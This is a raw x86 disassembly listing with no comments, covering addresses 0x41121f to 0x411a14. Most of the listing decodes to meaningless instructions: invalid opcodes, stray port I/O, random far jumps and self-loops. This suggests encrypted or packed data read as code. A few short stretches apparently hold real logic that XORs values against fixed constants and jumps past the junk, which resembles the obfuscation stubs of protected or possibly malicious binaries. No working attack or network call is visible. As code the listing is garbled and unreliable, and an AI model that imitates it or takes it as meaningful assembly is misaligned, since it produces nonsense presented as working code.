  41121f:	pushf  
  411220:	add    esp,DWORD PTR [edi]
  411222:	out    dx,eax
  411223:	mov    BYTE PTR [esi],bl
  411225:	pop    edx
  411226:	push   0xbdab8da9
  41122b:	fcmovnbe st,st(7)
  41122d:	outs   dx,DWORD PTR ds:[esi]
  41122e:	pop    esp
  41122f:	push   ebx
  411230:	sub    DWORD PTR [esi],esi
  411232:	div    BYTE PTR [edi-0x19]
  411235:	and    ah,BYTE PTR [edx-0x20e621de]
  41123b:	fist   WORD PTR [edi+0x11]
  41123e:	fbstp  TBYTE PTR [eax]
  411240:	fldcw  WORD PTR [esp+eax*2+0x6ce59d0b]
  411247:	add    DWORD PTR [edi+0x77],edi
  41124a:	sbb    DWORD PTR [edi-0x4ba5fa02],ebp
  411250:	mov    ecx,0xf2ad3bfd
  411255:	rcl    dh,0x1f
  411258:	push   0x1b
  41125a:	mov    ecx,0x45b5f9f7
  41125f:	fisttp WORD PTR [eax+0x6873aa3]
  411265:	jno    0x411281
  411267:	fnstsw WORD PTR [eax-0x4172586e]
  41126d:	xor    eax,0xa83c4d2c
  411272:	dec    ebp
  411273:	inc    esi
  411274:	out    0xc6,eax
  411276:	fwait
  411277:	push   ecx
  411278:	jmp    0xfa83:0x66cda6c0
  41127f:	or     DWORD PTR [eax-0x6b3ec423],edi
  411285:	xchg   edx,eax
  411286:	xchg   edi,eax
  411287:	mov    dh,0xd4
  411289:	mov    eax,ds:0x46574d4a
  41128e:	out    0x6c,eax
  411290:	mov    DWORD PTR [ecx+0x5cccb387],esi
  411296:	xchg   BYTE PTR [ecx],bh
  411298:	pushf  
  411299:	rcl    DWORD PTR [esi-0x69296c33],1
  41129f:	mov    ebp,DWORD PTR [ecx+0x9]
  4112a2:	add    DWORD PTR [eax-0x44],ebp
  4112a5:	in     eax,0x6a
  4112a7:	ficomp DWORD PTR [ecx-0x2d]
  4112aa:	push   ss
  4112ab:	and    eax,0x27d033a9
  4112b0:	(bad)  
  4112b1:	dec    esp
  4112b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4112b3:	mov    edx,0xe9f8bb6c
  4112b8:	pop    es
  4112b9:	(bad)
  4112bc:	loopne 0x4112fd
  4112be:	cmp    DWORD PTR [ebp+eiz*2-0xe],edx
  4112c2:	and    BYTE PTR [esi-0x18],ch
  4112c5:	sbb    al,0x6a
  4112c7:	jge    0x411250
  4112c9:	ret    
  4112ca:	pop    DWORD PTR [ecx]
  4112cc:	fisub  DWORD PTR [edi]
  4112ce:	add    BYTE PTR [edi+0x3565d9ac],al
  4112d4:	das    
  4112d5:	mov    al,ds:0xf6981e37
  4112da:	inc    esi
  4112db:	fs pop edx
  4112dd:	pop    ss
  4112de:	sbb    ebx,DWORD PTR [ecx+ebx*1+0x91a18df]
  4112e5:	rcl    edi,cl
  4112e7:	daa    
  4112e8:	out    dx,al
  4112e9:	jp     0x411282
  4112eb:	mov    cl,0xb8
  4112ed:	aaa    
  4112ee:	into   
  4112ef:	push   0x7d
  4112f1:	out    dx,al
  4112f2:	pusha  
  4112f3:	push   esi
  4112f4:	ins    DWORD PTR es:[edi],dx
  4112f5:	jb     0x41136b
  4112f7:	aaa    
  4112f8:	adc    al,BYTE PTR [ecx+0x3486ba36]
  4112fe:	(bad)  
  4112ff:	sbb    dl,BYTE PTR [edx+0x66]
  411302:	jns    0x41133c
  411304:	ins    BYTE PTR es:[edi],dx
  411305:	or     al,0x42
  411307:	pop    edi
  411308:	fild   QWORD PTR [ebx+0x274f4818]
  41130e:	xor    DWORD PTR [edi+0x5a],ebx
  411311:	ret    
  411312:	mul    edi
  411314:	pop    ds
  411315:	call   0x40c8:0x8c5804da
  41131c:	push   0xde56fdd4
  411321:	xor    eax,0xbbbebe5d
  411326:	mov    cl,0xed
  411328:	test   BYTE PTR [edx+0x1e3a55d7],bl
  41132e:	mov    al,0x98
  411330:	jmp    0x2558:0x94c5958b
  411337:	add    eax,0xdf24882f
  41133c:	out    dx,al
  41133d:	or     bh,al
  41133f:	xchg   edx,eax
  411341:	pusha  
  411342:	xchg   esi,eax
  411343:	sti    
  411344:	(bad)  
  411346:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411347:	fadd   DWORD PTR [eax-0x3955275e]
  41134d:	rol    BYTE PTR [edi-0x7e9eb5d6],cl
  411353:	sub    DWORD PTR [edx],edx
  411355:	dec    ebx
  411356:	push   edx
  411357:	xor    eax,DWORD PTR cs:[esi+0x446563e9]
  41135e:	test   al,0xee
  411360:	and    bl,BYTE PTR [ebp+0x7e]
  411363:	in     ax,dx
  411365:	std    
  411366:	and    dl,dh
  411368:	push   edx
  411369:	enter  0xfd18,0x51
  41136d:	imul   ebx,DWORD PTR [ebx-0x489679de],0x2e
  411374:	jecxz  0x41131d
  411376:	add    al,0xd9
  411378:	ins    DWORD PTR es:[edi],dx
  411379:	into   
  41137a:	dec    edx
  41137b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41137c:	jp     0x411300
  41137e:	push   cs
  41137f:	imul   eax,DWORD PTR [ebx+0x39],0xffffff95
  411383:	ss mov edx,0x60ff6e0e
  411389:	addr16 inc eax
  41138b:	das    
  41138c:	popa   
  41138d:	xchg   edx,eax
  41138e:	imul   ebx,DWORD PTR [edx+0x2ab55a9e],0x2504c2d3
  411398:	push   0x40
  41139a:	in     al,0x50
  41139c:	adc    BYTE PTR ds:0xe8cf3542,ch
  4113a2:	(bad)  
  4113a4:	call   0x6d9b:0xf4533bc3
  4113ab:	push   eax
  4113ac:	popa   
  4113ad:	aam    0x3b
  4113af:	dec    esp
  4113b0:	push   ss
  4113b1:	jg     0x411380
  4113b3:	push   ebp
  4113b4:	add    eax,0xe0ef0c4a
  4113b9:	pop    esi
  4113ba:	dec    esp
  4113bb:	into   
  4113bc:	mov    cl,0xa9
  4113be:	push   edx
  4113bf:	in     al,dx
  4113c0:	fsubr  QWORD PTR [esi-0x7a]
  4113c3:	in     eax,dx
  4113c4:	jmp    0x625a9a82
  4113c9:	or     al,0xc1
  4113cb:	out    0x56,eax
  4113cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4113ce:	cmp    eax,0xa1e855f6
  4113d3:	jmp    DWORD PTR [edx]
  4113d5:	std    
  4113d6:	mov    dh,0xe7
  4113d8:	add    eax,edi
  4113da:	sub    BYTE PTR [ebp+0x64],cl
  4113dd:	or     al,0xbe
  4113df:	dec    ecx
  4113e0:	mov    edi,0x9dc59e96
  4113e5:	pop    edx
  4113e6:	push   ecx
  4113e7:	jmp    0x8537d359
  4113ec:	dec    ebx
  4113ed:	push   ecx
  4113ee:	add    ah,BYTE PTR [ebx-0x71]
  4113f1:	push   edx
  4113f2:	shl    DWORD PTR [edx-0x4a881c4b],0xf5
  4113f9:	aad    0x62
  4113fb:	jge    0x41141f
  4113fd:	(bad)  
  4113fe:	leave  
  4113ff:	jle    0x4113e3
  411401:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411402:	pop    edi
  411403:	push   ss
  411404:	xor    BYTE PTR [edi-0x78c2ef34],dh
  41140a:	mov    WORD PTR [edx-0x1397611c],cs
  411410:	test   eax,0x579fbf08
  411415:	inc    eax
  411416:	loope  0x4113e4
  411418:	ret    
  411419:	outs   dx,DWORD PTR ds:[esi]
  41141a:	cmp    al,0xc8
  41141c:	push   0xffffffce
  41141e:	push   ebp
  41141f:	mov    esi,0x8d69585d
  411424:	jb     0x4113c6
  411426:	add    eax,0xf1cee61b
  41142b:	(bad)  
  41142c:	mov    edi,DWORD PTR gs:[ecx-0x6a8a2d41]
  411433:	scas   eax,DWORD PTR es:[edi]
  411434:	push   ecx
  411435:	outs   dx,DWORD PTR ds:[esi]
  411436:	cli    
  411437:	push   esi
  411438:	cwde   
  411439:	aad    0x69
  41143b:	ficom  WORD PTR [esi]
  41143d:	mov    eax,ds:0x96edcce8
  411443:	xor    DWORD PTR [ebx+0x3d18b6ef],edi
  411449:	xchg   ebx,eax
  41144a:	sbb    BYTE PTR [eax],ch
  41144c:	or     al,0xa1
  41144e:	js     0x411489
  411450:	ja     0x41143f
  411452:	dec    eax
  411453:	inc    edi
  411454:	mov    esi,ebx
  411456:	loopne 0x41146a
  411458:	sbb    eax,0xd00dcf28
  41145d:	pop    ds
  41145e:	xor    eax,0xe21459c9
  411463:	mov    ss,WORD PTR [edi+0x18957427]
  411469:	call   0x9100:0x6ffd4f8d
  411470:	xchg   esi,eax
  411471:	(bad)  
  411472:	mov    esp,0xf4f3e23e
  411477:	add    DWORD PTR [ebx-0x3c],ebx
  41147a:	xor    cl,BYTE PTR [eax]
  41147c:	cmp    DWORD PTR [edx+0x33],esp
  41147f:	sub    cl,BYTE PTR [edi]
  411481:	sar    bh,cl
  411483:	mov    dl,BYTE PTR [edi]
  411485:	test   al,0xac
  411487:	mov    ah,BYTE PTR [esi+0x3]
  41148a:	pop    esp
  41148b:	sub    edi,DWORD PTR [ebx]
  41148d:	pop    edx
  41148e:	jmp    0xa034:0x25e2f57c
  411495:	js     0x411458
  411497:	xlat   BYTE PTR ds:[ebx]
  411498:	fs push cs
  41149a:	int3   
  41149b:	and    dh,BYTE PTR [edx-0x32]
  41149e:	push   eax
  41149f:	push   ss
  4114a0:	ror    BYTE PTR [eax+edx*2],1
  4114a3:	lods   eax,DWORD PTR ds:[esi]
  4114a4:	push   ebp
  4114a5:	xlat   BYTE PTR ds:[ebx]
  4114a6:	push   edi
  4114a7:	sbb    eax,DWORD PTR [edi-0x9f5b039]
  4114ad:	shr    BYTE PTR [eax],0x46
  4114b0:	and    DWORD PTR [ebp-0x3f],0x2d23454a
  4114b7:	sti    
  4114b8:	shl    DWORD PTR [esp+eiz*8+0x271fa590],cl
  4114bf:	loop   0x4114a2
  4114c1:	xchg   ecx,eax
  4114c2:	loope  0x4114b0
  4114c4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4114c5:	xchg   DWORD PTR [ebx+0x68],eax
  4114c8:	mov    ch,0x1c
  4114ca:	dec    eax
  4114cb:	xor    al,0x90
  4114cd:	sar    DWORD PTR [edx-0x1],1
  4114d0:	cmp    eax,DWORD PTR [ecx+ebx*1-0x47bc21ff]
  4114d7:	retf   
  4114d8:	daa    
  4114d9:	add    eax,0xaed9d8fd
  4114de:	jecxz  0x4114ce
  4114e0:	adc    al,0x5c
  4114e2:	jns    0x411508
  4114e4:	or     al,BYTE PTR [ebp+0x26]
  4114e7:	sbb    DWORD PTR [ebp+0x11],ebx
  4114ea:	stos   BYTE PTR es:[edi],al
  4114eb:	add    cl,bl
  4114ed:	mov    ss,WORD PTR [edx]
  4114ef:	or     ebp,esp
  4114f1:	adc    BYTE PTR [ebp-0x4a],0x46
  4114f5:	ds int3 
  4114f7:	lods   al,BYTE PTR ds:[esi]
  4114f8:	or     DWORD PTR [edx],eax
  4114fa:	rol    BYTE PTR [edx],1
  4114fc:	dec    edx
  4114fd:	jbe    0x411507
  4114ff:	nop
  411500:	js     0x41155d
  411502:	xchg   edi,eax
  411503:	test   eax,0x118f7dfb
  411508:	xchg   ecx,eax
  411509:	scas   al,BYTE PTR es:[edi]
  41150a:	inc    ebx
  41150b:	int3   
  41150c:	imul   edi,DWORD PTR [ebp+0x13dbfc99],0x919aa6a3
  411516:	cmp    eax,0xd5df374b
  41151b:	inc    eax
  41151c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41151d:	mov    esi,0x3292e11a
  411522:	add    DWORD PTR [ecx],0xffffffcb
  411525:	push   edx
  411526:	icebp  
  411527:	rcr    ebx,cl
  411529:	or     DWORD PTR [esi+ebx*4-0x7a],0xffffffef
  41152e:	pushf  
  41152f:	pop    ebx
  411530:	push   ebx
  411531:	iret   
  411532:	sub    DWORD PTR ds:0x74e7eae6,esi
  411538:	stos   BYTE PTR es:[edi],al
  411539:	outs   dx,DWORD PTR ds:[esi]
  41153a:	adc    DWORD PTR [edi+0x286903bd],ecx
  411540:	inc    ebp
  411541:	jbe    0x411535
  411543:	in     eax,dx
  411544:	add    ch,BYTE PTR fs:[ecx]
  411547:	adc    al,0xe4
  411549:	stos   BYTE PTR es:[edi],al
  41154a:	mov    ax,ds:0x61fa11db
  411550:	push   es
  411551:	ret    
  411552:	push   cs
  411553:	mov    ah,0x99
  411555:	sub    eax,0xf0fb3b69
  41155a:	inc    edi
  41155b:	cs pop ss
  41155d:	sub    eax,0x529cd0c8
  411562:	ds nop
  411564:	xchg   ebx,eax
  411565:	or     dl,BYTE PTR [ecx+0x15e07687]
  41156b:	lods   al,BYTE PTR ds:[esi]
  41156c:	xor    eax,esp
  41156e:	xchg   ebx,eax
  41156f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411570:	test   eax,0x777c4fc5
  411575:	out    0xef,al
  411577:	out    dx,eax
  411578:	fstp   TBYTE PTR [ecx+0x58]
  41157b:	dec    esi
  41157c:	inc    edi
  41157d:	cs popa 
  41157f:	and    eax,0x2709ebad
  411584:	sti    
  411585:	add    eax,0x677c2d3
  41158a:	push   esi
  41158b:	ret    
  41158c:	cmp    al,BYTE PTR [eax-0x55411590]
  411592:	xlat   BYTE PTR ds:[ebx]
  411593:	xchg   ebp,eax
  411594:	es es (bad) 
  411597:	outs   dx,BYTE PTR ds:[esi]
  411598:	ror    DWORD PTR [ebx-0x40929cdd],1
  41159e:	jle    0x41156e
  4115a0:	jl     0x411587
  4115a2:	cmp    DWORD PTR ds:0xf5d72c84,esp
  4115a8:	rcl    esp,1
  4115aa:	adc    cl,BYTE PTR [esi-0x53]
  4115ad:	std    
  4115ae:	ret    
  4115af:	outs   dx,DWORD PTR ds:[esi]
  4115b0:	out    0x5,al
  4115b2:	sbb    BYTE PTR [ebx-0x79],bh
  4115b5:	ds scas al,BYTE PTR es:[edi]
  4115b7:	mov    eax,eax
  4115b9:	cld    
  4115ba:	push   esp
  4115bb:	mov    esi,eax
  4115bd:	add    al,0xec
  4115bf:	inc    ebp
  4115c0:	mov    al,0x4
  4115c2:	stos   DWORD PTR es:[edi],eax
  4115c3:	jp     0x41155c
  4115c5:	and    eax,DWORD PTR [ebx]
  4115c7:	pop    esp
  4115c8:	sbb    ah,ah
  4115ca:	jbe    0x4115e6
  4115cc:	ss in  al,0x6d
  4115cf:	pop    eax
  4115d0:	add    eax,0xa9f53848
  4115d5:	pop    es
  4115d6:	sub    BYTE PTR [esp+edi*8-0x19],bh
  4115da:	call   0x3006:0x4d53309a
  4115e1:	mov    edx,DWORD PTR [ebp+0x14]
  4115e4:	xor    eax,ecx
  4115e6:	add    eax,esi
  4115e8:	imul   eax,DWORD PTR [edx]
  4115eb:	mov    edx,DWORD PTR [ebp-0x4]
  4115ee:	xor    edx,ecx
  4115f0:	mov    ecx,DWORD PTR [ebp+0x8]
  4115f3:	lea    ecx,[edx+ecx*1+0x32729c]
  4115fa:	cmp    ecx,eax
  4115fc:	jmp    0x4119f0
  411601:	mov    ebx,0x93838448
  411606:	push   ebx
  411607:	mov    ebx,0x78da0248
  41160c:	bound  edx,QWORD PTR [ebp-0x112a7a93]
  411612:	inc    eax
  411613:	jo     0x411685
  411615:	dec    ecx
  411616:	jge    0x411688
  411618:	jo     0x4115d5
  41161a:	mov    eax,gs:0x66a4ab45
  411620:	fdiv   DWORD PTR [ebx-0x1d]
  411623:	jp     0x4115bd
  411625:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411626:	sti    
  411627:	jmp    0x411627
  411629:	(bad)  [eax+0x1c]
  41162c:	inc    ebp
  41162d:	outs   dx,DWORD PTR ds:[esi]
  41162e:	mov    edi,0xeaf7852c
  411633:	add    esi,DWORD PTR [edi+0x31fff058]
  411639:	js     0x41162a
  41163b:	popa   
  41163c:	inc    ebx
  41163d:	adc    BYTE PTR [eax+0x374d6fa9],cl
  411643:	sub    ebp,DWORD PTR [edx-0x46decc62]
  411649:	mov    ch,0x1
  41164b:	mov    dh,0x42
  41164d:	ja     0x411611
  41164f:	adc    DWORD PTR [ecx-0x30c0ad89],0xba04462c
  411659:	aad    0xc6
  41165b:	dec    esp
  41165c:	nop
  41165d:	std    
  41165e:	(bad)  
  41165f:	out    dx,al
  411660:	sbb    ch,BYTE PTR [ecx]
  411662:	repz test BYTE PTR [eax+0x35f693b1],dh
  411669:	leave  
  41166a:	ja     0x411671
  41166c:	xor    eax,0xee9b45cd
  411671:	cmp    dh,BYTE PTR [ebp-0x1b3ed66a]
  411677:	xlat   BYTE PTR ds:[ebx]
  411678:	mov    al,0x3f
  41167a:	out    0x33,al
  41167c:	(bad)  
  41167d:	retf   0x5119
  411680:	push   es
  411681:	jmp    0xb8ff:0x5feac52b
  411688:	in     ax,0x43
  41168b:	fdiv   QWORD PTR [esi+0xc]
  41168e:	(bad)  
  41168f:	pop    edi
  411690:	std    
  411691:	jl     0x411651
  411693:	mov    eax,0xcb9cf46a
  411698:	lock outs dx,DWORD PTR ds:[esi]
  41169a:	mov    bh,0xe1
  41169c:	mov    eax,0xdc487abe
  4116a1:	push   edx
  4116a2:	mov    bh,bl
  4116a4:	sbb    eax,0xe2ab2cf5
  4116a9:	out    0xf8,al
  4116ab:	push   esp
  4116ac:	push   es
  4116ad:	js     0x4116b7
  4116af:	out    0xff,eax
  4116b1:	fadd   QWORD PTR [edi+0x12fa8051]
  4116b7:	push   ebx
  4116b8:	lods   al,BYTE PTR ds:[esi]
  4116b9:	adc    eax,0xb0571e42
  4116be:	mov    ebx,0x997bfb8c
  4116c3:	ret    0x31e5
  4116c6:	pop    ecx
  4116c7:	fs and eax,0xb237ee88
  4116ce:	les    esi,FWORD PTR [ebx]
  4116d0:	ret    0xcd53
  4116d3:	xchg   esi,eax
  4116d4:	xor    al,cl
  4116d6:	adc    ebx,DWORD PTR [ebp+0x24]
  4116d9:	dec    ebp
  4116da:	xor    BYTE PTR [ebp-0x60],al
  4116dd:	cwde   
  4116de:	mov    ebx,0x57b62a10
  4116e3:	push   esi
  4116e4:	imul   BYTE PTR [ebp-0x737f72e1]
  4116ea:	ins    DWORD PTR es:[edi],dx
  4116eb:	lock inc eax
  4116ed:	cmp    eax,0xd56da40f
  4116f2:	cmp    ah,BYTE PTR [ebp-0x3d]
  4116f5:	mov    bl,0x93
  4116f7:	fsubrp st(1),st
  4116f9:	call   0x6652436a
  4116fe:	jns    0x4116a6
  411700:	sub    DWORD PTR [ecx+ecx*4+0x428c6753],0xd48e5aac
  41170b:	xchg   esp,eax
  41170c:	fsub   QWORD PTR [edi]
  41170e:	push   0xb3058cfa
  411713:	fwait
  411714:	test   eax,0xdafda236
  411719:	jo     0x411727
  41171b:	fist   WORD PTR [esi]
  41171d:	addr16 int3 
  41171f:	outs   dx,DWORD PTR ds:[esi]
  411720:	inc    ebx
  411721:	push   0x4a0d9f53
  411726:	leave  
  411727:	push   esi
  411728:	jge    0x4116bd
  41172a:	jbe    0x41175d
  41172c:	clc    
  41172d:	mov    esp,0x78f9df58
  411732:	mov    esi,0xabefe577
  411737:	rcr    ebx,1
  411739:	sub    DWORD PTR [ebp+0x58],ebx
  41173c:	dec    esp
  41173d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41173e:	mov    edx,0xf00b5938
  411743:	shl    BYTE PTR [eax+0x239e1a64],0x95
  41174a:	xchg   DWORD PTR [ebx+0x152058c],eax
  411750:	jmp    0x411750
  411752:	jns    0x411761
  411754:	mov    ecx,0x19d1ad4
  411759:	leave  
  41175a:	pop    ds
  41175b:	mov    ch,BYTE PTR ds:0x18cc6e24
  411761:	xor    BYTE PTR [eax+0xb],0xa
  411765:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411766:	mov    BYTE PTR [ebx+0x7f81047b],dh
  41176c:	dec    esp
  41176d:	int    0xbf
  41176f:	xchg   esp,eax
  411770:	call   0xb31f:0xebde3519
  411777:	pop    ss
  411778:	pop    esi
  411779:	popa   
  41177a:	nop
  41177b:	add    cl,BYTE PTR [eax-0x7a5f857d]
  411781:	(bad)  
  411782:	sahf   
  411783:	mov    bh,0xd6
  411785:	sbb    DWORD PTR [ebx-0x39709c93],ecx
  41178b:	inc    edx
  41178c:	or     DWORD PTR [edi],esi
  41178e:	popa   
  41178f:	xchg   esi,eax
  411790:	xchg   ecx,eax
  411791:	or     al,0x2f
  411793:	jge    0x411730
  411795:	push   ss
  411796:	mov    bl,0xae
  411798:	mov    eax,0x85a6b8da
  41179d:	out    dx,al
  41179e:	mov    bh,0xd0
  4117a0:	mov    ecx,0x93cd0a0e
  4117a5:	shr    BYTE PTR [ebx-0x6f9edd3],0xf4
  4117ac:	mov    edx,0x7089556b
  4117b1:	or     ebp,DWORD PTR [edi-0x25949dea]
  4117b7:	inc    DWORD PTR [ebp-0x57f56039]
  4117bd:	test   BYTE PTR [ebx],dh
  4117bf:	jmp    0x411757
  4117c1:	aad    0x83
  4117c3:	sbb    esi,DWORD PTR [ecx+ebx*4-0x1e05e871]
  4117ca:	dec    ebx
  4117cb:	mov    dh,0xe7
  4117cd:	ins    BYTE PTR es:[edi],dx
  4117ce:	aam    0x83
  4117d0:	push   ss
  4117d1:	cli    
  4117d2:	jl     0x4117eb
  4117d4:	jl     0x4117f0
  4117d6:	jmp    0xb799:0x6c869541
  4117dd:	xchg   ecx,eax
  4117de:	adc    eax,0x32b61456
  4117e3:	loope  0x4117b3
  4117e5:	inc    edx
  4117e6:	shr    BYTE PTR [edi+0x2eb94ab8],0x4
  4117ed:	inc    ebp
  4117ee:	pop    edx
  4117ef:	or     al,dl
  4117f1:	popf   
  4117f2:	jns    0x411825
  4117f4:	sub    al,0x38
  4117f6:	add    dl,BYTE PTR [eax-0x62]
  4117f9:	outs   dx,DWORD PTR ds:[esi]
  4117fa:	xor    al,0xe4
  4117fc:	sub    dh,BYTE PTR [ebx]
  4117fe:	sbb    dh,BYTE PTR [ecx-0x5e]
  411801:	js     0x4117e5
  411803:	xlat   BYTE PTR ds:[ebx]
  411804:	mov    BYTE PTR [ebp-0x4a],bl
  411807:	mov    cl,BYTE PTR [ebx]
  411809:	ins    DWORD PTR es:[edi],dx
  41180a:	xor    eax,0xa658ffd4
  41180f:	outs   dx,DWORD PTR ds:[esi]
  411810:	clc    
  411811:	jnp    0x4117d3
  411813:	jmp    0x411886
  411815:	shr    esp,0xa
  411818:	ret    0x370e
  41181b:	call   0x70431118
  411820:	out    dx,eax
  411821:	repz push ds
  411823:	loop   0x411884
  411825:	mov    eax,ds:0x4b61d73c
  41182a:	pop    esp
  41182b:	retf   0x8105
  41182e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41182f:	jno    0x41185a
  411831:	cmp    ah,BYTE PTR [edx+0x18ec3cc2]
  411837:	xchg   ebx,eax
  411838:	mov    ebx,0x58d00eb9
  41183d:	pusha  
  41183e:	adc    DWORD PTR [ecx-0x4b],ebp
  411841:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411842:	jmp    0x7fc765d0
  411847:	cdq    
  411848:	xor    edi,DWORD PTR [eax]
  41184a:	sar    WORD PTR ds:0xa0e4b119,cl
  411851:	adc    al,0x52
  411853:	iret   
  411854:	pop    esp
  411855:	push   ss
  411856:	in     eax,0x49
  411858:	inc    esp
  411859:	int3   
  41185a:	popa   
  41185b:	inc    edx
  41185c:	mov    es,WORD PTR [edx+0x25]
  41185f:	mov    edx,DWORD PTR [edi-0xd]
  411862:	shl    BYTE PTR gs:[edi+0x74],1
  411866:	mov    bl,0xf
  411868:	xchg   esi,eax
  411869:	nop
  41186a:	xor    ebp,DWORD PTR ds:0x99abcd72
  411870:	mov    esp,0x7a4f2ad1
  411875:	jl     0x4118da
  411877:	into   
  411878:	mov    ch,0x64
  41187a:	stc    
  41187b:	ja     0x4118eb
  41187d:	add    ch,BYTE PTR [esi-0x33]
  411880:	nop
  411881:	push   eax
  411882:	pop    edx
  411883:	dec    ebx
  411884:	outs   dx,DWORD PTR ds:[esi]
  411885:	retf   0x7b8e
  411888:	xchg   ebp,eax
  411889:	cli    
  41188a:	jmp    0x4118e1
  41188c:	fist   DWORD PTR [eax+0x5fcef621]
  411892:	rol    DWORD PTR [ebp-0x10],0xe9
  411896:	or     al,0xe3
  411898:	jmp    0xdfa85b5c
  41189d:	jmp    0x41191c
  41189f:	call   0xac13077b
  4118a4:	sbb    esi,DWORD PTR [ecx-0x48]
  4118a7:	jmp    0x636e:0xc489a6f9
  4118ae:	mov    eax,ds:0xbfa1a126
  4118b3:	inc    eax
  4118b4:	inc    esi
  4118b5:	ret    
  4118b6:	pop    edx
  4118b7:	or     al,0x87
  4118b9:	mov    dh,0x71
  4118bb:	or     DWORD PTR [esi-0x609453a1],esp
  4118c1:	xor    bl,dl
  4118c3:	xchg   ebp,eax
  4118c4:	retf   
  4118c5:	mov    WORD PTR [edx+0xa],?
  4118c8:	dec    ebp
  4118c9:	push   cs
  4118ca:	adc    ebp,0x6d68bdb0
  4118d0:	sbb    eax,0xc38f58fb
  4118d5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4118d6:	mov    ebp,0x70f320d
  4118db:	enter  0x13a7,0xae
  4118df:	cmp    eax,0xaa64d57b
  4118e4:	dec    ebp
  4118e5:	fadd   QWORD PTR [esi]
  4118e7:	mov    ah,0x0
  4118e9:	xchg   ecx,eax
  4118ea:	jnp    0x411899
  4118ec:	fcmovbe st,st(1)
  4118ee:	out    0x1a,eax
  4118f0:	jmp    0x3a5102bd
  4118f5:	xlat   BYTE PTR ds:[ebx]
  4118f6:	test   BYTE PTR [edx-0x575d0807],bh
  4118fc:	push   ds
  4118fd:	mul    BYTE PTR es:[esi-0x14]
  411901:	xchg   esp,eax
  411902:	adc    ebp,DWORD PTR [esi]
  411904:	popf   
  411905:	ret    
  411906:	mov    BYTE PTR [esi+0x6e6127b0],dh
  41190c:	arpl   WORD PTR ds:0x3a8242ba,dx
  411912:	sbb    DWORD PTR [ebx],ebx
  411914:	addr16 (bad) 
  411916:	and    al,0xbf
  411918:	je     0x411982
  41191a:	pop    ss
  41191b:	in     eax,dx
  41191c:	jg     0x4118f5
  41191e:	mov    edi,0xdf955904
  411923:	ret    0x8fd8
  411926:	into   
  411927:	scas   eax,DWORD PTR es:[edi]
  411928:	add    ebp,DWORD PTR [ebx-0x64]
  41192b:	pusha  
  41192c:	sub    al,0x1c
  41192e:	xlat   BYTE PTR ss:[ebx]
  411930:	pop    ds
  411931:	sbb    esp,ebp
  411933:	mov    esi,DWORD PTR [ecx]
  411935:	rcr    ebp,0x50
  411938:	mov    BYTE PTR [ecx+0x2cefeef9],ch
  41193e:	mov    edi,0xf1575963
  411943:	jp     0x411982
  411945:	and    eax,0x8df24300
  41194a:	xchg   edx,eax
  41194b:	pop    ebp
  41194c:	(bad)  
  41194d:	pushf  
  41194e:	jb     0x41199a
  411950:	hlt    
  411951:	and    al,0x12
  411953:	mov    esi,0xc5129617
  411958:	cmp    DWORD PTR [ecx+0x66],ebx
  41195b:	(bad)
  41195e:	in     eax,0xea
  411960:	and    BYTE PTR [edi],ah
  411962:	or     al,0x32
  411964:	pop    ebx
  411965:	cmp    eax,0xd024112d
  41196a:	iret   
  41196b:	lea    esi,[eax+0x26]
  41196e:	fidivr WORD PTR [ebp-0x77]
  411971:	inc    eax
  411972:	dec    eax
  411973:	sub    bh,BYTE PTR [ebp-0x4f]
  411976:	cmc    
  411977:	out    0x95,al
  411979:	std    
  41197a:	cli    
  41197b:	test   BYTE PTR [ebp-0x27],0x9e
  41197f:	push   ds
  411980:	inc    eax
  411981:	fwait
  411982:	pop    esp
  411983:	sub    eax,0x50b37138
  411988:	mov    ds:0x4e62380b,al
  41198d:	pusha  
  41198e:	jge    0x41192a
  411990:	inc    ecx
  411991:	not    BYTE PTR [esi+0x2b8ec341]
  411997:	or     al,0xaa
  411999:	fisub  WORD PTR [eax]
  41199b:	xor    DWORD PTR [esi+esi*2],ebp
  41199e:	jmp    0x45fe09c6
  4119a3:	add    edi,DWORD PTR [eax+ecx*8]
  4119a6:	push   0x26
  4119a8:	bound  esp,QWORD PTR [ebx+ebp*8-0x63]
  4119ac:	je     0x411a01
  4119ae:	push   esi
  4119af:	cmc    
  4119b0:	xor    eax,0xc09e83d7
  4119b5:	mov    eax,ds:0x22cc1f22
  4119ba:	mov    DWORD PTR [ebp+eax*1-0x20],ebx
  4119be:	mov    cl,0xd2
  4119c0:	in     eax,dx
  4119c1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4119c2:	push   ebp
  4119c3:	xchg   ebx,eax
  4119c4:	in     al,dx
  4119c5:	xchg   edi,eax
  4119c6:	daa    
  4119c7:	jne    0x4119e3
  4119c9:	pop    esi
  4119ca:	jmp    0x2cd60c43
  4119cf:	aam    0x9f
  4119d1:	mov    al,0xa4
  4119d3:	jne    0x4119b9
  4119d5:	jecxz  0x4119a3
  4119d7:	(bad)  
  4119d8:	cmp    dl,BYTE PTR [esi+edx*8]
  4119db:	fimul  DWORD PTR [ecx+0x3e]
  4119de:	int3   
  4119df:	fnstsw WORD PTR [ebx-0x48a6ac81]
  4119e5:	and    al,0x84
  4119e7:	inc    ebx
  4119e8:	fcomp  QWORD PTR [edx+0x17]
  4119eb:	add    cl,BYTE PTR cs:[ebx]
  4119ee:	xchg   ecx,eax
  4119ef:	push   cs
  4119f0:	jne    0x4109bc
  4119f6:	mov    ebx,esi
  4119f8:	jmp    0x411a02
  4119fd:	mov    ebx,0x32729c
  411a02:	mov    eax,DWORD PTR [ebp-0x4]
  411a05:	xor    eax,0x7510855
  411a0a:	add    eax,ebx
  411a0c:	mov    DWORD PTR [ebp-0xc],eax
  411a0f:	xor    ebx,ebx
  411a11:	lea    eax,[ebp-0x10]
  411a14:	add    ebx,DWORD PTR [eax]
